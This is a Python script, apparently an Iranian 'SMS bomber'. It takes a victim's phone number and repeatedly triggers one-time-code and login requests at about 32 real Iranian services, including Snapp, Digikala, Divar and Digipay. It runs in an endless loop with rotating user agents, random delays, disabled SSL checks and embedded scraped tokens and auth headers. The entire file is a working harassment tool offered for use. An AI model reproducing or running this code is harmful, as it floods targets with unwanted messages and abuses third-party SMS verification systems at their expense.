# -*- coding: utf-8 -*-
import requests
import json
import urllib3
from colorama import init, Fore, Back, Style
from time import sleep
import random
import sys

# غیرفعال کردن هشدارهای SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# تنظیمات اولیه colorama
init(autoreset=True)

# لیست user-agent های مختلف
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
]

def get_random_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive"
    }

def print_banner():
    print(Fore.MAGENTA + """
   ____  __  __ ____    ____                              
  / ___||  \/  / ___|  / ___| _ __ ___   __ _ _ __  _ __  
  \___ \| |\/| \___ \  \___ \| '_ ` _ \ / _` | '_ \| '_ \ 
   ___) | |  | |___) |  ___) | | | | | | (_| | |_) | |_) |
  |____/|_|  |_|____/  |____/|_| |_| |_|\__,_| .__/| .__/ 
                                             |_|   |_|    
    """)
    print(Fore.MAGENTA + "🟣 Co: Dr.MMP1")
    print(Fore.CYAN + "=" * 40)

def send_torob_pin(phone_number):
    """ارسال کد پی‌آی‌ان از طریق توروب"""
    try:
        url = "https://api.torob.com/v4/user/phone/send-pin/"
        params = {
            "phone_number": phone_number,
            "_http_referrer": "https://www.google.com/",
            "source": "next_desktop"
        }
        headers = get_random_headers()
        headers.update({
            "Host": "api.torob.com",
            "Referer": "https://torob.com/",
            "Origin": "https://torob.com"
        })
        
        response = requests.get(url, params=params, headers=headers, timeout=20, verify=False)
        return response.status_code == 200
    except:
        return False

def send_alibaba_otp(phone_number):
    """ارسال کد تأیید از طریق آلیبان"""
    try:
        url = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
        headers = get_random_headers()
        headers.update({
            "Host": "ws.alibaba.ir",
            "Content-Type": "application/json",
            "Referer": "https://www.alibaba.ir/",
            "Origin": "https://www.alibaba.ir"
        })
        payload = {"phoneNumber": phone_number}
        
        response = requests.post(url, headers=headers, json=payload, timeout=20, verify=False)
        return response.status_code == 200
    except:
        return False

def send_karnaval_sms(phone_number):
    """ارسال پیامک از طریق کارناوال"""
    try:
        response = requests.post(
            "https://www.karnaval.ir/api-2/graphql",
            json={
                "queryId": "0edebe0df353cee7f11614a37087371f",
                "variables": {"phone": phone_number, "isSecondAttempt": False}
            },
            headers=get_random_headers(),
            timeout=20,
            verify=False
        )
        return response.status_code == 200
    except:
        return False

def send_payaneh_sms(phone_number):
    """ارسال پیامک از طریق پایانه"""
    try:
        response = requests.post(
            "https://api-v2.payaneh.ir/api/otp-send",
            json={"phone": phone_number},
            headers={
                "Host": "api-v2.payaneh.ir",
                "Content-Type": "application/json",
                "User-Agent": random.choice(USER_AGENTS),
                "site-key": "P/SX1ZuIKISPHngo",
                "Origin": "https://payaneh.ir",
                "Referer": "https://payaneh.ir/"
            },
            timeout=20,
            verify=False
        )
        return response.status_code == 200
    except:
        return False

def send_mrbilit_sms(phone_number):
    """ارسال پیامک از طریق MrBilit"""
    try:
        response = requests.get(
            "https://auth.mrbilit.ir/api/Token/send",
            params={'mobile': phone_number},
            headers={
                'User-Agent': random.choice(USER_AGENTS),
                'Referer': 'https://mrbilit.com/',
                'Origin': 'https://mrbilit.com'
            },
            timeout=20,
            verify=False
        )
        return response.status_code == 200
    except:
        return False

def send_basalam_otp(phone_number):
    """ارسال کد تأیید از طریق باسلام"""
    try:
        url = "https://auth.basalam.com/captcha/otp-request"
        headers = get_random_headers()
        headers.update({
            "Host": "auth.basalam.com",
            "Content-Type": "application/json",
            "Referer": "https://basalam.com/",
            "X-Client-Info": json.dumps({
                "version": "2.11.1",
                "project": "charsou",
                "name": "web.public",
                "platform": "web",
                "deviceId": "e3c2fec0-c144-4442-a5a3-cabcec85c177",
                "sessionId": "574d8dea-fe18-4a21-b2ad-ffe7582dded9"
            }),
            "X-Creation-Tags": json.dumps({
                "client": "customer-charsou",
                "os": "windows",
                "uri": "%2F",
                "fullPath": "https%3A%2F%2Fbasalam.com%2F",
                "device": "desktop",
                "app": "web"
            }),
            "Origin": "https://basalam.com"
        })
        payload = {
            "mobile": phone_number,
            "client_id": "11"
        }
        
        response = requests.post(url, headers=headers, json=payload, timeout=20, verify=False)
        return response.status_code == 200
    except:
        return False

def send_snap_otp(phone_number):
    """ارسال کد تأیید از طریق اسنپ"""
    try:
        headers = {
            "Host": "app.snapp.taxi",
            "content-length": "29",
            "x-app-name": "passenger-pwa",
            "x-app-version": "5.0.0",
            "app-version": "pwa",
            "user-agent": random.choice(USER_AGENTS),
            "content-type": "application/json",
            "accept": "*/*",
            "origin": "https://app.snapp.taxi",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://app.snapp.taxi/login/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "fa-IR,fa;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6"
        }
        payload = {"cellphone": phone_number}
        
        response = requests.post(
            "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
            headers=headers,
            json=payload,
            timeout=20,
            verify=False
        )
        return "OK" in response.text
    except:
        return False

def send_gap_otp(phone_number):
    """ارسال کد تأیید از طریق گپ"""
    try:
        headers = {
            "Host": "core.gap.im",
            "accept": "application/json, text/plain, */*",
            "x-version": "4.5.7",
            "accept-language": "fa",
            "user-agent": random.choice(USER_AGENTS),
            "appversion": "web",
            "origin": "https://web.gap.im",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://web.gap.im/",
            "accept-encoding": "gzip, deflate, br"
        }
        
        response = requests.get(
            f"https://core.gap.im/v1/user/add.json?mobile=%2B98{phone_number[1:]}",
            headers=headers,
            timeout=20,
            verify=False
        )
        return "OK" in response.text
    except:
        return False

def send_tap30_otp(phone_number):
    """ارسال کد تأیید از طریق تپسی"""
    try:
        headers = {
            "Host": "tap33.me",
            "Connection": "keep-alive",
            "Content-Length": "63",
            "User-Agent": random.choice(USER_AGENTS),
            "content-type": "application/json",
            "Accept": "*/*",
            "Origin": "https://app.tapsi.cab",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://app.tapsi.cab/",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "fa-IR,fa;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6"
        }
        payload = {"credential":{"phoneNumber": phone_number,"role":"PASSENGER"}}
        
        response = requests.post(
            "https://tap33.me/api/v2/user",
            headers=headers,
            json=payload,
            timeout=20,
            verify=False
        )
        return response.json().get('result') == "OK"
    except:
        return False

def send_divar_otp(phone_number):
    """ارسال کد تأیید از طریق دیوار"""
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://divar.ir',
            'referer': 'https://divar.ir/',
            'user-agent': random.choice(USER_AGENTS),
            'x-standard-divar-error': 'true'
        }
        payload = {"phone": phone_number[1:]}
        
        response = requests.post(
            "https://api.divar.ir/v5/auth/authenticate",
            headers=headers,
            json=payload,
            timeout=20,
            verify=False
        )
        return response.json().get("authenticate_response") == "AUTHENTICATION_VERIFICATION_CODE_SENT"
    except:
        return False

def send_snapptrip_otp(phone_number):
    """ارسال کد تأیید از طریق اسنپ تریپ"""
    try:
        url = "https://platform-api.snapptrip.com/profile/auth/request-otp"
        headers = get_random_headers()
        headers.update({
            "Content-Type": "application/json",
            "Origin": "https://www.snapptrip.com",
            "Referer": "https://www.snapptrip.com/"
        })
        payload = {"phoneNumber": phone_number}
        
        response = requests.post(url, headers=headers, json=payload, timeout=20, verify=False)
        return response.status_code == 200
    except:
        return False

def send_digikala_otp(phone_number):
    """ارسال کد تأیید از طریق دیجی‌کالا"""
    try:
        url = "https://api.digikala.com/v1/user/authenticate/"
        headers = get_random_headers()
        headers.update({
            "Host": "api.digikala.com",
            "Content-Type": "application/json",
            "X-Web-Client": "desktop",
            "Origin": "https://www.digikala.com",
            "Referer": "https://www.digikala.com/"
        })
        payload = {
            "backUrl": "/",
            "username": phone_number,
            "otp_call": False,
            "hash": None
        }
        
        response = requests.post(url, headers=headers, json=payload, timeout=20, verify=False)
        return response.status_code == 200
    except:
        return False

def send_clarity_sms(phone_number):
    """ارسال پیامک از طریق Clarity"""
    try:
        url = "https://k.clarity.ms/collect"
        headers = get_random_headers()
        headers.update({
            "Host": "k.clarity.ms",
            "Accept": "application/x-clarity-gzip",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://123kif.com",
            "Referer": "https://123kif.com/"
        })
        data = {
            "action": "sms_ajax_login_action",
            "phonenumber": phone_number,
            "redirecturl": "https://123kif.com/luggage/",
            "security": "963735510f"
        }
        
        response = requests.post(url, headers=headers, data=data, timeout=20, verify=False)
        return response.status_code == 200
    except:
        return False

def send_buykif_otp(phone_number):
    """ارسال کد تأیید از طریق Buykif"""
    try:
        url = "https://buykif.ir/bakala/ajax/send_code/"
        headers = get_random_headers()
        headers.update({
            "Host": "buykif.ir",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://buykif.ir",
            "Referer": "https://buykif.ir/product-category/suitcase/"
        })
        data = {
            "action": "bakala_send_code",
            "phone_email": phone_number
        }
        
        response = requests.post(url, headers=headers, data=data, timeout=20, verify=False)
        return response.status_code == 200
    except:
        return False

def send_yektanet_otp(phone_number):
    """ارسال کد تأیید از طریق Yektanet"""
    try:
        url = "https://audience.yektanet.com/api/v1/scripts/preview/validate/?app_id=mVwShsHC"
        headers = get_random_headers()
        headers.update({
            "Host": "audience.yektanet.com",
            "Origin": "https://mikaland.ir",
            "Referer": "https://mikaland.ir/"
        })
        data = {
            "__RequestVerificationToken": "IcAxGN4gdJDA9AvEFGUZuQ8jK_mbfjM5NseEwUwMZIq8PbkfKPvyjJwqaPvmr51vLmK9eM2BuWr1VER1xtoYU8KnLuO1ufJ7JaIxKQlD-JM1",
            "Username": phone_number,
            "login": "ادامه"
        }
        
        response = requests.post(url, headers=headers, data=data, timeout=20, verify=False)
        return response.status_code == 200
    except:
        return False

def send_chamedon_otp(phone_number):
    """ارسال کد تأیید از طریق Chamedon"""
    try:
        url = "https://chamedonshop.ir/users/login-register/"
        headers = get_random_headers()
        headers.update({
            "Host": "chamedonshop.ir",
            "Content-Type": "multipart/form-data",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://chamedonshop.ir",
            "Referer": "https://chamedonshop.ir/users/login/"
        })
        data = {
            "username": phone_number,
            "csrfmiddlewaretoken": "QFR5erV22aJn8Li1kLv8lWMJAwm8opQaJD3i4wk97dvD8YtaV9mqImABtibueAav"
        }
        
        response = requests.post(url, headers=headers, data=data, timeout=20, verify=False)
        return response.status_code == 200
    except:
        return False

def send_banimode_otp(phone_number):
    """ارسال کد تأیید از طریق بانی مد"""
    try:
        url = "https://mobapi.banimode.com/api/v2/auth/request"
        headers = get_random_headers()
        headers.update({
            "Host": "mobapi.banimode.com",
            "Content-Type": "application/json;charset=utf-8",
            "platform": "desktop",
            "Origin": "https://www.banimode.com",
            "Referer": "https://www.banimode.com"
        })
        payload = {"phone": phone_number}
        
        response = requests.post(url, headers=headers, json=payload, timeout=20, verify=False)
        return response.status_code == 200
    except:
        return False

def send_eligasht_otp(phone_number):
    """ارسال کد تأیید از طریق الی گشت"""
    try:
        url = "https://api2.eligasht.com/api/account/register"
        headers = get_random_headers()
        headers.update({
            "Host": "api2.eligasht.com",
            "Accept-Language": "fa-IR",
            "Content-Type": "application/json",
            "UUID": "c20e6133-c788-4448-a997-5c220030d43a",
            "Origin": "https://www.eligasht.com",
            "Referer": "https://www.eligasht.com/"
        })
        payload = {"userName": phone_number}
        
        response = requests.post(url, headers=headers, json=payload, timeout=20, verify=False)
        return response.status_code == 200
    except:
        return False

def send_flightio_otp(phone_number):
    """ارسال کد تأیید از طریق فلایت یو"""
    try:
        url = "https://flightio.com/bff/Authentication/CheckUserKey"
        headers = get_random_headers()
        headers.update({
            "Host": "flightio.com",
            "Accept-Language": "fa_IR",
            "Content-Type": "application/json",
            "f-lang": "fa",
            "DeviceType": "Windows",
            "f-ses-id": "ddfde09c-b431-4217-9daa-f9e867756922",
            "app-type": "desktop-browser",
            "client-v": "10.29.8",
            "Origin": "https://flightio.com",
            "Referer": "https://flightio.com/"
        })
        payload = {"userKey": f"98-{phone_number[1:]}", "userKeyType": 1}
        
        response = requests.post(url, headers=headers, json=payload, timeout=20, verify=False)
        return response.status_code == 200
    except:
        return False

def send_trip_otp(phone_number):
    """ارسال کد تأیید از طریق تریپ"""
    try:
        url = "https://gateway-v2.trip.ir/api/v1/totp/send-to-phone-and-email"
        headers = get_random_headers()
        headers.update({
            "Host": "gateway-v2.trip.ir",
            "Content-Type": "application/json;charset=UTF-8",
            "x-twa-user": "false",
            "Origin": "https://www.trip.ir",
            "Referer": "https://www.trip.ir/"
        })
        payload = {"phoneNumber": phone_number}
        
        response = requests.post(url, headers=headers, json=payload, timeout=20, verify=False)
        return response.status_code == 200
    except:
        return False

def send_flytoday_otp(phone_number):
    """ارسال کد تأیید از طریق فلای تودی"""
    try:
        url = "https://api.flytoday.ir/api/v3/user/CheckLogin"
        headers = get_random_headers()
        headers.update({
            "Host": "api.flytoday.ir",
            "Content-Type": "application/json",
            "X-App": "www.flytoday.ir",
            "X-Path": "https://www.flytoday.ir/flight",
            "X-Token": "3167394476546b3968475a4737742b4c4f413631697671696b585249366177543078313855716335634d6e4b62546c6b3351464a58356f7363546b4969676a6e",
            "Origin": "https://www.flytoday.ir",
            "Referer": "https://www.flytoday.ir/"
        })
        payload = {"username": "nUmF6vka+25+/wCy0Tqglw=="}
        
        response = requests.post(url, headers=headers, json=payload, timeout=20, verify=False)
        return response.status_code == 200
    except:
        return False

def send_utravs_otp(phone_number):
    """ارسال کد تأیید از طریق یوتراوز"""
    try:
        url = "https://api.utravs.com/v2/auth/Authentication/AuthenticateUserWithMobile"
        headers = get_random_headers()
        headers.update({
            "Host": "api.utravs.com",
            "TraceId": "57f51633-6fc4-40ad-bcfe-e3c9535f79b7",
            "Content-Type": "application/json",
            "sentry-trace": "f826a437d3924137b4747119a1a07da6-acd5ec89a206fc1f-1",
            "baggage": "sentry-environment=production,sentry-release=1.0.25,sentry-public_key=47ada398a80f1e4ce8a00a855352fc8c,sentry-trace_id=f826a437d3924137b4747119a1a07da6,sentry-transaction=%2F,sentry-sampled=true,sentry-sample_rand=0.20063795091643744,sentry-sample_rate=1",
            "Origin": "https://utravs.com",
            "Referer": "https://utravs.com/"
        })
        payload = {"countryDialingCode": "+98", "messageType": 1, "mobile": f"+98{phone_number[1:]}"}
        
        response = requests.post(url, headers=headers, json=payload, timeout=20, verify=False)
        return response.status_code == 200
    except:
        return False

def send_ghasedak24_otp(phone_number):
    """ارسال کد تأیید از طریق قاصدک 24"""
    try:
        url = "https://ghasedak24.com/user/otp"
        headers = get_random_headers()
        headers.update({
            "Host": "ghasedak24.com",
            "Content-Type": "multipart/form-data; boundary=---------------------------8412472282403384930597855545",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://ghasedak24.com",
            "Referer": "https://ghasedak24.com/flights/international"
        })
        data = f"-----------------------------8412472282403384930597855545\r\nContent-Disposition: form-data; name=\"mobile\"\r\n\r\n{phone_number}\r\n-----------------------------8412472282403384930597855545--"
        
        response = requests.post(url, headers=headers, data=data, timeout=20, verify=False)
        return response.status_code == 200
    except:
        return False

def send_belityar_otp(phone_number):
    """ارسال کد تأیید از طریق بلیط یار"""
    try:
        url = "https://belityar.ir/login/twoStepsLogin/json"
        headers = get_random_headers()
        headers.update({
            "Host": "belityar.ir",
            "Source": "nuxt",
            "Content-Type": "application/json",
            "language": "fa",
            "Origin": "https://belityar.ir",
            "Referer": "https://belityar.ir/login"
        })
        payload = {"username": phone_number}
        
        response = requests.post(url, headers=headers, json=payload, timeout=20, verify=False)
        return response.status_code == 200
    except:
        return False

def send_hotelato_otp(phone_number):
    """ارسال کد تأیید از طریق هتل آتو"""
    try:
        url = "https://hotelato.ir/gds/ajax"
        headers = get_random_headers()
        headers.update({
            "Host": "hotelato.ir",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://hotelato.ir",
            "Referer": "https://hotelato.ir/gds/fa/authenticate"
        })
        data = {
            "method": "callAuthenticateDigitCodeCreate",
            "className": "members",
            "entry": phone_number,
            "to_json": "true"
        }
        
        response = requests.post(url, headers=headers, data=data, timeout=20, verify=False)
        return response.status_code == 200
    except:
        return False

def send_dgshahr_otp(phone_number):
    """ارسال کد تأیید از طریق دی‌جی‌شهر"""
    try:
        url = "https://lend-b.dgshahr.com/user/login/"
        headers = get_random_headers()
        headers.update({
            "Host": "lend-b.dgshahr.com",
            "Content-Type": "application/json",
            "Origin": "https://lend.dgshahr.com",
            "Referer": "https://lend.dgshahr.com/"
        })
        payload = {"phone_number": phone_number, "source": " google-organic"}
        
        response = requests.post(url, headers=headers, json=payload, timeout=20, verify=False)
        return response.status_code == 200
    except:
        return False

def send_digipay_otp(phone_number):
    """ارسال کد تأیید از طریق دیجی‌پی"""
    try:
        url = "https://api.mydigipay.com/digipay/api/users/send-sms"
        headers = get_random_headers()
        headers.update({
            "Host": "api.mydigipay.com",
            "Content-Type": "application/json",
            "Agent": "WEB",
            "Client-Version": "1.0.0",
            "Digipay-Version": "2025-01-01",
            "Origin": "https://app.mydigipay.com",
            "Authorization": "Basic d2ViYXBwLWNsaWVudC1pZDp3ZWJhcHAtY2xpZW50LXNlY3JldC1kZWJlZTc5ZC1iMDRkLTQ3ZWYtOGVkNS1jMzJlMjRlYzgzNmU=",
            "Referer": "https://app.mydigipay.com/"
        })
        payload = {
            "cellNumber": phone_number,
            "device": {
                "deviceId": "c20ae0be-1631-48ce-8f98-f28a5c83b54f",
                "deviceModel": "Windows/Firefox",
                "deviceAPI": "WEB_BROWSER",
                "osName": "WEB"
            }
        }
        
        response = requests.post(url, headers=headers, json=payload, timeout=20, verify=False)
        return response.status_code == 200
    except:
        return False

def send_kalabala_otp(phone_number):
    """ارسال کد تأیید از طریق کالابالا"""
    try:
        url = "https://kalabala.ir/wp-admin/admin-ajax.php"
        headers = get_random_headers()
        headers.update({
            "Host": "kalabala.ir",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://kalabala.ir",
            "Referer": "https://kalabala.ir/?login=true&page=1&redirect_to=https%3A%2F%2Fkalabala.ir%2F"
        })
        data = {
            "login_digt_countrycode": "+98",
            "digits_phone": phone_number[1:],
            "digits_email": "",
            "action_type": "phone",
            "digits": "1",
            "instance_id": "8b66f787b6afcde552726eff2bccf0af",
            "action": "digits_forms_ajax",
            "type": "login"
        }
        
        response = requests.post(url, headers=headers, data=data, timeout=20, verify=False)
        return response.status_code == 200
    except:
        return False

def send_technolife_otp(phone_number):
    """ارسال کد تأیید از طریق تکنولایف"""
    try:
        url = "https://www.technolife.ir/shop_customer"
        headers = get_random_headers()
        headers.update({
            "Host": "www.technolife.ir",
            "Content-Type": "application/json",
            "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.S3hCa0MxNlh1THBHMjVPdlhuQzMwRmNBdUUzMll5SnJOMzQ=.FqQvD23WaTjB18FpAjA26JqBkJ26BePnD28",
            "Origin": "https://www.technolife.ir",
            "Referer": "https://www.technolife.ir/"
        })
        payload = {
            "query": "query check_customer_exists ($username: String, $repeat: Boolean) { check_customer_exists (username: $username, repeat: $repeat) { result request_id } }",
            "variables": {"username": phone_number},
            "operationName": "check_customer_exists"
        }
        
        response = requests.post(url, headers=headers, json=payload, timeout=20, verify=False)
        return response.status_code == 200
    except:
        return False

def send_gooshishop_otp(phone_number):
    """ارسال کد تأیید از طریق گوگل شاپ"""
    try:
        url = "https://gooshishop.com/resendotptoken?returnurl=/"
        headers = get_random_headers()
        headers.update({
            "Host": "gooshishop.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://gooshishop.com",
            "Referer": "https://gooshishop.com/otpverification?returnUrl=%2F"
        })
        data = {
            "PhoneNumber": phone_number,
            "TokenType": "Register",
            "__RequestVerificationToken": "CfDJ8MRf3pCCZ4xKicNnzrUAl4QUX08yeHer0OsXhFjn3yoULFbiEmaS6b29B1gzOVVZN4KvxBMgR4YPUEHOdxFc0xz1HtNKZz2hq7Mu5ynBS6k_N2gxOzEh_M0TG5h1Eu7NdPMOoLfZltKIQWk8bz9aIyQ"
        }
        
        response = requests.post(url, headers=headers, data=data, timeout=20, verify=False)
        return response.status_code == 200
    except:
        return False

def send_theforge_otp(phone_number):
    """ارسال کد تأیید از طریق فورج"""
    try:
        url = "https://accounts.theforge.ir/Account/SignIn"
        headers = get_random_headers()
        headers.update({
            "Host": "accounts.theforge.ir",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "null",
            "Referer": "https://accounts.theforge.ir/"
        })
        data = {
            "ReturnUrl": "%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Dnew-production-zoomit%26redirect_uri%3Dhttps%253A%252F%252Fwww.zoomit.ir%252Fauth%252Fcallback%26response_type%3Dcode%26scope%3Dopenid%2520profile%2520offline_access%26state%3Db515ff5f734849c195acb39cd6ec2614%3Bhttps%253A%252F%252Fwww.zoomit.ir%252Fproduct%252Flist%252Fmobile%252F%26code_challenge%3D-7ajhEz6J4nyxOdmNnsRFsmcTNB9wLX7QA49terqNzw%26code_challenge_method%3DS256",
            "Username": phone_number,
            "__RequestVerificationToken": "CfDJ8LYOpEp8nX1LuurmL6CTpyrzu_IWfWrqMK1gPexqOcASpI4oHDbAYfQbJ4gqu8zQRpqyqCjZGoQE0oMqie2a00OVHCrEG4vKxPgEGY7VHAQQJdo8Cj1BHo7vNiTWgUthutr5TRcXQRJmzxkVC0CQmSs"
        }
        
        response = requests.post(url, headers=headers, data=data, timeout=20, verify=False)
        return response.status_code == 200
    except:
        return False

def send_mo7_otp(phone_number):
    """ارسال کد تأیید از طریق مو7"""
    try:
        url = "https://mo7.ir/bakala/ajax/send_code/"
        headers = get_random_headers()
        headers.update({
            "Host": "mo7.ir",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-CSRF-TOKEN": "48cefadfc8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://mo7.ir",
            "Referer": "https://mo7.ir/product-category/%d8%ae%d8%b1%db%8c%d8%af-%d9%84%d9%88%d8%a7%d8%b2%d9%85-%d8%ae%d8%a7%d9%86%da%af%db%8c/"
        })
        data = {
            "action": "bakala_send_code",
            "phone_email": phone_number
        }
        
        response = requests.post(url, headers=headers, data=data, timeout=20, verify=False)
        return response.status_code == 200
    except:
        return False

def main():
    print_banner()
    
    # دریافت شماره تلفن
    while True:
        try:
            phone_part = input(Fore.BLUE + "☎️ Phon Namber: 09")
            if len(phone_part) == 9 and phone_part.isdigit():
                phone_number = "09" + phone_part
                break
            print(Fore.RED + "❌ شماره نامعتبر! لطفاً 9 رقم آخر را وارد کنید (مثال: 9123456789)")
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n⏹ توقف توسط کاربر")
            sys.exit(0)
    
    print(Fore.CYAN + "=" * 40)
    print(Fore.YELLOW + "🔸 شروع عملیات ارسال پیامک...")
    print(Fore.CYAN + "=" * 40)
    
    counter = 1
    
    # حلقه بی‌نهایت برای ارسال پیامک
    while True:
        try:
            print(Fore.WHITE + f"\n🌀 دور ارسال شماره {counter}:")
            
            # لیست تمام سرویس‌ها (همراه با API های جدید)
            services = {
                "Torob": send_torob_pin(phone_number),
                "Alibaba": send_alibaba_otp(phone_number),
                "Karnaval": send_karnaval_sms(phone_number),
                "Payaneh": send_payaneh_sms(phone_number),
                "MrBilit": send_mrbilit_sms(phone_number),
                "Basalam": send_basalam_otp(phone_number),
                "Snapp": send_snap_otp(phone_number),
                "Gap": send_gap_otp(phone_number),
                "Tap30": send_tap30_otp(phone_number),
                "Divar": send_divar_otp(phone_number),
                "SnappTrip": send_snapptrip_otp(phone_number),
                "Digikala": send_digikala_otp(phone_number),
                "Clarity": send_clarity_sms(phone_number),
                "Buykif": send_buykif_otp(phone_number),
                "Yektanet": send_yektanet_otp(phone_number),
                "Chamedon": send_chamedon_otp(phone_number),
                "Banimode": send_banimode_otp(phone_number),
                "Eligasht": send_eligasht_otp(phone_number),
                "Flightio": send_flightio_otp(phone_number),
                "Trip": send_trip_otp(phone_number),
                "Flytoday": send_flytoday_otp(phone_number),
                "Utravs": send_utravs_otp(phone_number),
                "Ghasedak24": send_ghasedak24_otp(phone_number),
                "Belityar": send_belityar_otp(phone_number),
                "Hotelato": send_hotelato_otp(phone_number),
                "Dgshahr": send_dgshahr_otp(phone_number),
                "Digipay": send_digipay_otp(phone_number),
                "Kalabala": send_kalabala_otp(phone_number),
                "Technolife": send_technolife_otp(phone_number),
                "Gooshishop": send_gooshishop_otp(phone_number),
                "Theforge": send_theforge_otp(phone_number),
                "Mo7": send_mo7_otp(phone_number)
            }
            
            # نمایش نتایج
            success_count = sum(1 for status in services.values() if status)
            fail_count = len(services) - success_count
            
            for service, status in services.items():
                status_text = Fore.GREEN + "✅ موفق" if status else Fore.RED + "❌ ناموفق"
                print(Fore.WHITE + f"{service.ljust(15)} : {status_text}")
            
            print(Fore.CYAN + "-" * 40)
            print(Fore.WHITE + f"جمع کل: {Fore.GREEN}{success_count} موفق {Fore.WHITE}| {Fore.RED}{fail_count} ناموفق")
            
            counter += 1
            
            # تاخیر تصادفی بین 5 تا 15 ثانیه
            delay = random.randint(5, 15)
            print(Fore.CYAN + f"\n⏳ انتظار برای {delay} ثانیه... (Ctrl+C برای خروج)")
            sleep(delay)
            
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n⏹ توقف توسط کاربر")
            break
        except Exception as e:
            print(Fore.RED + f"\n⚠️ خطا: {str(e)}")
            sleep(10)

if __name__ == "__main__":
    main()